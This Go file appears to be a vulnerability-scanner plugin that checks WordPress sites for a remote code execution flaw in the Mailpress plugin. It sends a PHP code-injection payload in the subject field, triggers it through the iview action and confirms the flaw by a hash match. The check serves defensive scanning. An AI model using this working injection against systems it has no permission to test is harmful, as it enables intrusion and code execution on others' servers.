package goplugin

import (
	"net/http"
	"regexp"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type wordPressMailpressRCE struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("wordpress", &wordPressMailpressRCE{})
}
func (d *wordPressMailpressRCE) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "WordPress Mailpress Plugin 远程代码执行漏洞",
		Remarks: "WordPress Mailpress Plugin 插件中, mailpress/mp-includes/class/MP_Actions.class.php 文件中 iview 函数中 subject 参数未经过滤，直接拼接do_eval函数执行代码，而do_eval函数也未经任何过滤，导致远程代码执行漏洞。",
		Level:   0,
		Type:    "RCE",
		Author:  "wolf",
		References: plugin.References{
			URL: "https://github.com/Medicean/VulApps/tree/master/w/wordpress/2",
			CVE: "",
		},
	}
	return d.info
}
func (d *wordPressMailpressRCE) GetResult() []plugin.Plugin {
	return d.result
}
func (d *wordPressMailpressRCE) Check(URL string, meta plugin.TaskMeta) bool {
	poc := "/wp-content/plugins/mailpress/mp-includes/action.php"
	postData := "action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<?php+print_r(md5(666));?>&html=&plaintext=&mail_format=standard&autosave=1"
	request, err := http.NewRequest("POST", URL+poc, strings.NewReader(postData))
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if err != nil {
		return false
	}
	resp, err := util.RequestDo(request, true)
	if err != nil {
		return false
	}
	digitsRegexp := regexp.MustCompile(`autosave id='(\d+)'`)
	m := digitsRegexp.FindStringSubmatch(resp.ResponseRaw)
	if len(m) < 2 {
		return false
	}
	poc2 := "/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id=" + m[1]
	request, err = http.NewRequest("GET", URL+poc2, nil)
	if err != nil {
		return false
	}
	resp, err = util.RequestDo(request, true)
	if err != nil {
		return false
	}
	if strings.Contains(resp.ResponseRaw, "fae0b27c451c728867a567e8c1bb4e53") {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
